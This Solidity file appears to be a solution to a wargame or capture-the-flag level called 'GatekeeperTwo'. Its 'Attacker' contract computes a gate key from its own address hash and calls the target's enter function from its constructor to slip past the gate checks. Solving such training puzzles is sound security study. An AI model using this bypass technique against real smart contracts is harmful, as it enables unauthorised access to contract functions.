// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GatekeeperTwo{
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
    GatekeeperTwo public target;
    address payable public owner;
    bytes8 public gateKey ;

    constructor(address _to_call) {
        target = GatekeeperTwo(_to_call);
        owner = payable(msg.sender);
        gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        target.enter(gateKey);
    }
}
